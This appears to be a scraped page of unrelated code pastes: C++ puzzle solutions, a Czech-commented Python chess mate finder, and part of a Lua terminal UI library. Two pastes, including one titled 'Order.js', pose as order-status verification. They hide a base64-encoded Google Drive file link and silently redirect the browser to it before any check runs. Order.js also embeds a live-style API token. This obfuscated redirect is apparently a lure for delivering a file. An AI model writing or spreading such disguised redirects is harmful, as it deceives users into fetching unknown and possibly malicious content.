  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Md6L6rxx,召唤数学精灵 参考代码,Dmaxiya,C++,Sunday 30th of March 2025 01:14:05 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;

LL sum(LL x) {
    return (1 + x) * x / 2 % 100;
}

LL mult(LL x) {
    LL ret = 1;
    for (LL i = 1; i <= x; ++i) {
        ret = ret * i % 100;
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    int cnt = 0;
    for (int i = 1; i <= 2000; ++i) {
        if ((sum(i) - mult(i)) % 100 == 0) {
            ++cnt;
            cout << i << "": "" << cnt << endl;
        }
    }
    cout << ""2024041331404202"" << endl;
    cout << ""202404133140400"" << endl;
    cout <<  ""40480826628086"" << endl;

    return 0;
}"
gVRKn7Vs,Order.js,luqlegal,JavaScript,Sunday 30th of March 2025 01:02:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/328/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R9K81i48,Untitled,Josif_tepe,C++,Sunday 30th of March 2025 12:58:32 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

int dist(int si, int sj, int ei, int ej) {
    return abs(si - ei) + abs(sj - ej);
}
pair<int, int> idx[maxn];
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            idx[cnt] = {i, j};
            cnt++;
        }
    }
    
    cnt = 1;
    ll res = 0;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            if(cnt != mat[i][j]) {
                pair<int, int> p = {i, j};
                
                while(cnt != mat[p.first][p.second]) {
                    res += dist(p.first, p.second, idx[mat[p.first][p.second]].first, idx[mat[p.first][p.second]].second);
                    p = idx[mat[p.first][p.second]];
                }
            }
            cnt++;
        }
    }
    cout << res << endl;
    
    
    
    return 0;
    
}
"
aN4Yp4Bv,QUITE GOOD!,max2201111,Python,Sunday 30th of March 2025 12:57:36 PM CDT,"#!/usr/bin/env python3
import time
from math import inf

# Reprezentace stran: 'w' = bílý, 'b' = černý.
# Šachovnice se reprezentuje jako 8x8 pole znaků (řádek 0 odpovídá 8. řadě).

###############################################################################
# Třída Board – reprezentuje šachovnici a umí ji inicializovat z FEN řetězce.
###############################################################################

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice; pokud je zadán FEN, nastaví pozici podle něj.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()  # např. {'K','Q','k','q'}
        self.en_passant = None       # (row, col) nebo None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        # FEN řady začínají od horní (8.) a jdou dolů
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

###############################################################################
# Funkce pro detekci šachu, generování tahů a jejich provádění
###############################################################################

def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    # Útoky pěšcem
    if side=='w':
        if kr+1 < 8 and kc-1 >= 0 and board.grid[kr+1][kc-1] == 'p': return True
        if kr+1 < 8 and kc+1 < 8 and board.grid[kr+1][kc+1] == 'p': return True
    else:
        if kr-1 >= 0 and kc-1 >= 0 and board.grid[kr-1][kc-1] == 'P': return True
        if kr-1 >= 0 and kc+1 < 8 and board.grid[kr-1][kc+1] == 'P': return True
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]
    enemy_knights = ['n','a','c','e'] if enemy_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        r, c = kr+dr, kc+dc
        if 0<=r<8 and 0<=c<8 and board.grid[r][c] in enemy_knights:
            return True
    # Útoky po řadách a sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if enemy_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        r, c = kr+dr, kc+dc
        while 0<=r<8 and 0<=c<8:
            if board.grid[r][c] != '.':
                if board.grid[r][c] in enemy_rook_like:
                    return True
                break
            r += dr; c += dc
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if enemy_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        r, c = kr+dr, kc+dc
        while 0<=r<8 and 0<=c<8:
            if board.grid[r][c] != '.':
                if board.grid[r][c] in enemy_bishop_like:
                    return True
                break
            r += dr; c += dc
    # Sousední král
    enemy_king = 'k' if enemy_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            r, c = kr+dr, kc+dc
            if 0<=r<8 and 0<=c<8 and board.grid[r][c] == enemy_king:
                return True
    return False

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    enemy = 'b' if side=='w' else 'w'
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc]!='.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády (základní verze – detailní bezpečnostní kontroly se provádí při provádění tahu)
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Klouzavé tahy (pro R, Q, E, A)
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    return moves

# Zásobník pro tahy (pro možnost undo)
move_stack = []

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží potřebné informace pro undo.
       move: (r1, c1, r2, c2, promo, special)""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    board.grid[r1][c1] = '.'
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    if special == 'double':
        board.en_passant = (r1 + ( -1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    board.grid[r1][c1] = piece
    board.grid[r2][c2] = captured
    board.castling_rights, board.en_passant = prev_state
    board.to_move = 'b' if board.to_move=='w' else 'w'

###############################################################################
# Negamax s alfa-beta ořezáváním
###############################################################################

def negamax(board, depth, alpha, beta, side):
    """"""Negamax s alfa-beta ořezáváním. side: 1 pokud hledáme z pohledu bílé, -1 pro černé.
       Vrací (hodnota, tahová sekvence).""""""
    moves = generate_pseudo_moves(board, 'w' if side==1 else 'b')
    if not moves:
        return ((-inf if is_in_check(board, 'w' if side==1 else 'b') else 0), [])
    if depth == 0:
        return (0, [])
    best_val = -inf
    best_line = []
    for move in moves:
        make_move(move, board)
        if is_in_check(board, 'w' if side==1 else 'b'):
            undo_move(board)
            continue
        val, line = negamax(board, depth-1, -beta, -alpha, -side)
        val = -val
        undo_move(board)
        if val > best_val:
            best_val = val
            best_line = [move] + line
        alpha = max(alpha, best_val)
        if alpha >= beta:
            break
    return best_val, best_line

###############################################################################
# Iterativní prohlubování – hledáme do maximální hloubky a vypisujeme uplynulý čas
###############################################################################

def iterative_deepening(board, max_depth=50):
    best_line = []
    best_val = 0
    start_time = time.time()
    for depth in range(1, max_depth+1):
        t0 = time.time()
        val, line = negamax(board, depth, -inf, inf, 1 if board.to_move=='w' else -1)
        t1 = time.time()
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        print(f""Hloubka {depth:2d} – uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        best_val = val
        best_line = line
        if val == inf or val == -inf:
            break
    total_elapsed = time.time() - start_time
    return best_val, best_line, total_elapsed

###############################################################################
# Převod tahu do šachové notace
###############################################################################

def move_to_notation(move):
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    s = cols[c1] + str(8 - r1) + cols[c2] + str(8 - r2)
    if promo:
        s += ""="" + promo.upper()
    if special == 'enpassant':
        s += "" e.p.""
    return s

###############################################################################
# Hlavní program – inicializace z FEN a výpis optimální tahové sekvence
###############################################################################

def main():
    # Nastavíme pozici ze zadaného FEN (např.: ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1"")
    fen = ""8/6A1/8/8/8/k1K5/8/8 w - - 0 1""
    board_obj = Board(fen)
    board = board_obj.copy()
    
    print(""Počáteční pozice:"")
    print(board.display())
    print(""\nVyhledávání optimální tahové sekvence – iterativní prohlubování...\n"")
    
    best_val, best_line, total_elapsed = iterative_deepening(board, max_depth=50)
    hrs = int(total_elapsed // 3600)
    mins = int((total_elapsed % 3600) // 60)
    secs = int(total_elapsed % 60)
    
    # Postupné provádění tahů a výpis pozic
    variant_board = board.copy()
    moves_notation = []
    print(""Postup tahů:"")
    print(""-""*40)
    print(""Start:"")
    print(variant_board.display())
    print(""-""*40)
    for move in best_line:
        s = move_to_notation(move)
        moves_notation.append(s)
        make_move(move, variant_board)
        print(""Tah:"", s)
        print(variant_board.display())
        print(""-""*40)
    
    if best_val == inf:
        result_text = ""Mat – bílý vyhrává""
    elif best_val == -inf:
        result_text = ""Mat – černý vyhrává""
    else:
        # Zkontrolujeme, zda tahy vedou k patu
        side_to_move = 'b' if board.to_move=='w' else 'w'
        if not generate_pseudo_moves(variant_board, side_to_move) and not is_in_check(variant_board, side_to_move):
            result_text = ""Pat (remíza)""
        else:
            result_text = ""Remíza""
    print(""Optimální tahová sekvence:"", "" "".join(moves_notation) if moves_notation else ""(žádný tah)"")
    print(""Výsledek:"", result_text)
    print(f""Celkový uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")

if __name__ == '__main__':
    main()
"
7QarNwLL,Musiclo | CC:T music player,TIMAS_Bro,Lua,Sunday 30th of March 2025 12:56:42 PM CDT,"local expect = require ""cc.expect"".expect

-- Initialization code
local PrimeUI = {}
do
    local coros = {}
    local restoreCursor

    --- Adds a task to run in the main loop.
    ---@param func function The function to run, usually an `os.pullEvent` loop
    function PrimeUI.addTask(func)
        expect(1, func, ""function"")
        local t = {coro = coroutine.create(func)}
        coros[#coros+1] = t
        _, t.filter = coroutine.resume(t.coro)
    end

    --- Sends the provided arguments to the run loop, where they will be returned.
    ---@param ... any The parameters to send
    function PrimeUI.resolve(...)
        coroutine.yield(coros, ...)
    end

    --- Clears the screen and resets all components. Do not use any previously
    --- created components after calling this function.
    function PrimeUI.clear()
        -- Reset the screen.
        term.setCursorPos(1, 1)
        term.setCursorBlink(false)
        term.setBackgroundColor(colors.black)
        term.setTextColor(colors.white)
        term.clear()
        -- Reset the task list and cursor restore function.
        coros = {}
        restoreCursor = nil
    end

    --- Sets or clears the window that holds where the cursor should be.
    ---@param win window|nil The window to set as the active window
    function PrimeUI.setCursorWindow(win)
        expect(1, win, ""table"", ""nil"")
        restoreCursor = win and win.restoreCursor
    end

    --- Gets the absolute position of a coordinate relative to a window.
    ---@param win window The window to check
    ---@param x number The relative X position of the point
    ---@param y number The relative Y position of the point
    ---@return number x The absolute X position of the window
    ---@return number y The absolute Y position of the window
    function PrimeUI.getWindowPos(win, x, y)
        if win == term then return x, y end
        while win ~= term.native() and win ~= term.current() do
            if not win.getPosition then return x, y end
            local wx, wy = win.getPosition()
            x, y = x + wx - 1, y + wy - 1
            _, win = debug.getupvalue(select(2, debug.getupvalue(win.isColor, 1)), 1) -- gets the parent window through an upvalue
        end
        return x, y
    end

    --- Runs the main loop, returning information on an action.
    ---@return any ... The result of the coroutine that exited
    function PrimeUI.run()
        while true do
            -- Restore the cursor and wait for the next event.
            if restoreCursor then restoreCursor() end
            local ev = table.pack(os.pullEvent())
            -- Run all coroutines.
            for _, v in ipairs(coros) do
                if v.filter == nil or v.filter == ev[1] then
                    -- Resume the coroutine, passing the current event.
                    local res = table.pack(coroutine.resume(v.coro, table.unpack(ev, 1, ev.n)))
                    -- If the call failed, bail out. Coroutines should never exit.
                    if not res[1] then error(res[2], 2) end
                    -- If the coroutine resolved, return its values.
                    if res[2] == coros then return table.unpack(res, 3, res.n) end
                    -- Set the next event filter.
                    v.filter = res[2]
                end
            end
        end
    end
end

--- Draws a thin border around a screen region.
---@param win window The window to draw on
---@param x number The X coordinate of the inside of the box
---@param y number The Y coordinate of the inside of the box
---@param width number The width of the inner box
---@param height number The height of the inner box
---@param fgColor color|nil The color of the border (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.borderBox(win, x, y, width, height, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    fgColor = expect(6, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(7, bgColor, ""number"", ""nil"") or colors.black
    -- Draw the top-left corner & top border.
    win.setBackgroundColor(bgColor)
    win.setTextColor(fgColor)
    win.setCursorPos(x - 1, y - 1)
    win.write(""\x9C"" .. (""\x8C""):rep(width))
    -- Draw the top-right corner.
    win.setBackgroundColor(fgColor)
    win.setTextColor(bgColor)
    win.write(""\x93"")
    -- Draw the right border.
    for i = 1, height do
        win.setCursorPos(win.getCursorPos() - 1, y + i - 1)
        win.write(""\x95"")
    end
    -- Draw the left border.
    win.setBackgroundColor(bgColor)
    win.setTextColor(fgColor)
    for i = 1, height do
        win.setCursorPos(x - 1, y + i - 1)
        win.write(""\x95"")
    end
    -- Draw the bottom border and corners.
    win.setCursorPos(x - 1, y + height)
    win.write(""\x8D"" .. (""\x8C""):rep(width) .. ""\x8E"")
end

--- Creates a clickable button on screen with text.
---@param win window The window to draw on
---@param x number The X position of the button
---@param y number The Y position of the button
---@param text string The text to draw on the button
---@param action function|string A function to call when clicked, or a string to send with a `run` event
---@param fgColor color|nil The color of the button text (defaults to white)
---@param bgColor color|nil The color of the button (defaults to light gray)
---@param clickedColor color|nil The color of the button when clicked (defaults to gray)
---@param periphName string|nil The name of the monitor peripheral, or nil (set if you're using a monitor - events will be filtered to that monitor)
function PrimeUI.button(win, x, y, text, action, fgColor, bgColor, clickedColor, periphName)
    expect(1, win, ""table"")
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, text, ""string"")
    expect(5, action, ""function"", ""string"")
    fgColor = expect(6, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(7, bgColor, ""number"", ""nil"") or colors.gray
    clickedColor = expect(8, clickedColor, ""number"", ""nil"") or colors.lightGray
    periphName = expect(9, periphName, ""string"", ""nil"")
    -- Draw the initial button.
    win.setCursorPos(x, y)
    win.setBackgroundColor(bgColor)
    win.setTextColor(fgColor)
    win.write("" "" .. text .. "" "")
    -- Get the screen position and add a click handler.
    PrimeUI.addTask(function()
        local buttonDown = false
        while true do
            local event, button, clickX, clickY = os.pullEvent()
            local screenX, screenY = PrimeUI.getWindowPos(win, x, y)
            if event == ""mouse_click"" and periphName == nil and button == 1 and clickX >= screenX and clickX < screenX + #text + 2 and clickY == screenY then
                -- Initiate a click action (but don't trigger until mouse up).
                buttonDown = true
                -- Redraw the button with the clicked background color.
                win.setCursorPos(x, y)
                win.setBackgroundColor(clickedColor)
                win.setTextColor(fgColor)
                win.write("" "" .. text .. "" "")
            elseif (event == ""monitor_touch"" and periphName == button and clickX >= screenX and clickX < screenX + #text + 2 and clickY == screenY)
                or (event == ""mouse_up"" and button == 1 and buttonDown) then
                -- Finish a click event.
                if clickX >= screenX and clickX < screenX + #text + 2 and clickY == screenY then
                    -- Trigger the action.
                    if type(action) == ""string"" then
                        PrimeUI.resolve(""button"", action)
                    else
                        action()
                    end
                end
                -- Redraw the original button state.
                win.setCursorPos(x, y)
                win.setBackgroundColor(bgColor)
                win.setTextColor(fgColor)
                win.write("" "" .. text .. "" "")
            end
        end
    end)
end

--- Draws a line of text, centering it inside a box horizontally.
---@param win window The window to draw on
---@param x number The X position of the left side of the box
---@param y number The Y position of the box
---@param width number The width of the box to draw in
---@param text string The text to draw
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.centerLabel(win, x, y, width, text, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, text, ""string"")
    fgColor = expect(6, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(7, bgColor, ""number"", ""nil"") or colors.black
    assert(#text <= width, ""string is too long"")
    win.setCursorPos(x + math.floor((width - #text) / 2), y)
    win.setTextColor(fgColor)
    win.setBackgroundColor(bgColor)
    win.write(text)
end

--- Creates a list of entries with toggleable check boxes.
---@param win window The window to draw on
---@param x number The X coordinate of the inside of the box
---@param y number The Y coordinate of the inside of the box
---@param width number The width of the inner box
---@param height number The height of the inner box
---@param selections table<string,string|boolean> A list of entries to show, where the value is whether the item is pre-selected (or `""R""` for required/forced selected)
---@param action function|string|nil A function or `run` event that's called when a selection is made
---@param fgColor color|nil The color of the text (defaults to white)
---@param bgColor color|nil The color of the background (defaults to black)
function PrimeUI.checkSelectionBox(win, x, y, width, height, selections, action, fgColor, bgColor)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    expect(6, selections, ""table"")
    expect(7, action, ""function"", ""string"", ""nil"")
    fgColor = expect(8, fgColor, ""number"", ""nil"") or colors.white
    bgColor = expect(9, bgColor, ""number"", ""nil"") or colors.black
    -- Calculate how many selections there are.
    local nsel = 0
    for _ in pairs(selections) do nsel = nsel + 1 end
    -- Create the outer display box.
    local outer = window.create(win, x, y, width, height)
    outer.setBackgroundColor(bgColor)
    outer.clear()
    -- Create the inner scroll box.
    local inner = window.create(outer, 1, 1, width - 1, nsel)
    inner.setBackgroundColor(bgColor)
    inner.setTextColor(fgColor)
    inner.clear()
    -- Draw each line in the window.
    local lines = {}
    local nl, selected = 1, 1
    for k, v in pairs(selections) do
        inner.setCursorPos(1, nl)
        inner.write((v and (v == ""R"" and ""[-] "" or ""[\xD7] "") or ""[ ] "") .. k)
        lines[nl] = {k, not not v}
        nl = nl + 1
    end
    -- Draw a scroll arrow if there is scrolling.
    if nsel > height then
        outer.setCursorPos(width, height)
        outer.setBackgroundColor(bgColor)
        outer.setTextColor(fgColor)
        outer.write(""\31"")
    end
    -- Set cursor blink status.
    inner.setCursorPos(2, selected)
    inner.setCursorBlink(true)
    PrimeUI.setCursorWindow(inner)
    -- Get screen coordinates & add run task.
    local screenX, screenY = PrimeUI.getWindowPos(win, x, y)
    PrimeUI.addTask(function()
        local scrollPos = 1
        while true do
            -- Wait for an event.
            local ev = table.pack(os.pullEvent())
            -- Look for a scroll event or a selection event.
            local dir
            if ev[1] == ""key"" then
                if ev[2] == keys.up then dir = -1
                elseif ev[2] == keys.down then dir = 1
                elseif ev[2] == keys.space and selections[lines[selected][1]] ~= ""R"" then
                    -- (Un)select the item.
                    lines[selected][2] = not lines[selected][2]
                    inner.setCursorPos(2, selected)
                    inner.write(lines[selected][2] and ""\xD7"" or "" "")
                    -- Call the action if passed; otherwise, set the original table.
                    if type(action) == ""string"" then PrimeUI.resolve(""checkSelectionBox"", action, lines[selected][1], lines[selected][2])
                    elseif action then action(lines[selected][1], lines[selected][2])
                    else selections[lines[selected][1]] = lines[selected][2] end
                    -- Redraw all lines in case of changes.
                    for i, v in ipairs(lines) do
                        local vv = selections[v[1]] == ""R"" and ""R"" or v[2]
                        inner.setCursorPos(2, i)
                        inner.write((vv and (vv == ""R"" and ""-"" or ""\xD7"") or "" ""))
                    end
                    inner.setCursorPos(2, selected)
                end
            elseif ev[1] == ""mouse_scroll"" and ev[3] >= screenX and ev[3] < screenX + width and ev[4] >= screenY and ev[4] < screenY + height then
                dir = ev[2]
            end
            -- Scroll the screen if required.
            if dir and (selected + dir >= 1 and selected + dir <= nsel) then
                selected = selected + dir
                if selected - scrollPos < 0 or selected - scrollPos >= height then
                    scrollPos = scrollPos + dir
                    inner.reposition(1, 2 - scrollPos)
                end
                inner.setCursorPos(2, selected)
            end
            -- Redraw scroll arrows and reset cursor.
            outer.setCursorPos(width, 1)
            outer.write(scrollPos > 1 and ""\30"" or "" "")
            outer.setCursorPos(width, height)
            outer.write(scrollPos < nsel - height + 1 and ""\31"" or "" "")
            inner.restoreCursor()
        end
    end)
end

--- Creates a clickable region on screen without any content.
---@param win window The window to draw on
---@param x number The X position of the button
---@param y number The Y position of the button
---@param width number The width of the inner box
---@param height number The height of the inner box
---@param action function|string A function to call when clicked, or a string to send with a `run` event
---@param periphName string|nil The name of the monitor peripheral, or nil (set if you're using a monitor - events will be filtered to that monitor)
function PrimeUI.clickRegion(win, x, y, width, height, action, periphName)
    expect(1, win, ""table"")
    expect(2, x, ""number"")
    expect(3, y, ""number"")
    expect(4, width, ""number"")
    expect(5, height, ""number"")
    expect(6, action, ""function"", ""string"")
    expect(7, periphName, ""string"", ""nil"")
    PrimeUI.addTask(function()
        -- Get the screen position and add a click handler.
        local screenX, screenY = PrimeUI.getWindowPos(win, x, y)
        local buttonDown = false
        while true do
            local event, button, clickX, clickY = os.pullEvent()
            if (event == ""monitor_touch"" and periphName == button)
                or (event == ""mouse_click"" and button == 1 and periphName == nil) then
                -- Finish a click event.
                if clickX >= screenX and clickX < screenX + width
                    and clickY >= screenY and clickY < screenY + height then
